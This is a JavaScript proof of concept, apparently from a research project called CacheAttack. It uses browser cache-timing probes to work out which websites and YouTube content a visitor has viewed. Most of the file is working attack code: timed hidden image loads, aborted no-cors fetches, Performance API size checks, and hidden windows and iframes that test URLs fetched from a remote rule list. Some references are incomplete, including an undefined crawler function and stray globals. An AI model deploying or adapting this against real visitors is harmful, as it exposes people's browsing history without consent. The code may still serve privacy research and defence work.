/*jshint esversion: 8 */

// NDev 2020 https://github.com/NDevTK/CacheAttack
max = 125;
let firefox = navigator.userAgent.includes("Firefox");
ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    let body = await req.json();  
    return chunk(body, 100);
}

function chunk(arr, size){
  let chunked = [];
  for(let ele of arr){
    let last = chunked[chunked.length - 1]
    if(!last || last.length === size){
      chunked.push([ele])
    } else {
      last.push(ele)
    }
  }
  return chunked
}

async function speedTest() {
    var url = "https://ndev.tk/README.md?test=" + Math.random();
    await fetch(url);
    var i = 0
    while (true) {
        i += 1;
        let result = await ifCached(url);
        if (!result) return console.info(i);
        let result2 = await ifCached("https://ndev.tk/README.md?test=" + Math.random());
        if(result2) return console.info(i);
    }
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if(res === undefined) return null;
    if(is304(res)) return true;
    return (res.transferSize === 0);
}

async function PromiseForeach(item, callback) {
  var jobs = [];
  item.forEach(value => jobs.push(callback(value)));
  await Promise.all(jobs);
}

async function getWebsites(cb, CacheTest = true, performanceCheck = true) {
    var output = [];
    var callback = (cb) ? cb : website => {
    	output.push(website);
    };
    var Websites = await getRules();
    if(CacheTest) {
        let TestResult = await ifCached_test();
        if(!TestResult) throw "Cache is not working :-(";
    }
    // Foreach website check if cached
    for (let chunk of Websites) {
	await PromiseForeach(chunk, async website => {
		let check = null;
		let result = await ifCached(website[0]);
		if(performanceCheck === true) check = PerformanceCheck(website[0]);		
		if(check || result && check === null) {
			callback(website[1]);
		}
	});
    }
    return output;
}

async function getVideos(callback) {
  checkedChannels = [];
  let r = await fetch("https://cache.ndev.tk/channels");
  let channels = await r.json();
  YTCrawler(channels, callback);
}



async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    await fetch("https://ndev.tk/README.md");
    let result2 = await ifCached("https://ndev.tk/README.md");
    return (!result && result2);
}

async function ifCached_1Wrap(url) {
    try {
        await ifCached_1(url);
    } catch(err) {
        return false;
    }
    return true;
}

function ifCached_1(url) {
    return new Promise((resolve, reject) => {
        let img = new Image(0, 0);
        img.hidden = true;
        img.onerror = _ => {
            clearTimeout(timeout);
            checkActive = false;
            resolve();
        };
        img.onload = _ => resolve();
        img.src = url;
        var timeout = setTimeout(_ => {
            img.src = "";
            img.remove();
            reject();
        }, max);
    });
}

async function ifCached_2(url) {
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors", signal});
    } catch(err) {
	    // Website blocked by client
	    clearTimeout(timeout);
	}
    clearTimeout(timeout);
    return state;
}

function WindowEvent(check = false) {
  return new Promise(resolve => {
    window.addEventListener('message', e => {
      if(check !== false && e.data !== check) return;
      resolve(e.data);
    });
  });
}

function initChecker() {
  checker = open("https://cache.ndev.tk/window.html");
}

// Currently fails if not in loop
async function ifCached_3(url) {
  checker.postMessage(url);
  let event = await WindowEvent();
  if(event === "load") {
    return console.log("Wrong state");
  }
  if(event) {
    checker.location = "https://cache.ndev.tk/window.html";
  }
  await WindowEvent("load");
  if(firefox) await new Promise(resolve => setTimeout(resolve, 50));
  return event;
}

async function block(url) {
    for (;;) {
        if(checker.closed) location.reload();
        checker.postMessage(url);
        checker.location = "https://cache.ndev.tk/window.html";
        await WindowEvent();
    }
}

function blockerFrame(url) {
    if (document.getElementById("ifrm")) {
      return ifrm.src = "https://cache.ndev.tk/window.html";
    }
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.id = "ifrm";
    ifrm.hidden = true;
    document.body.appendChild(ifrm);
}
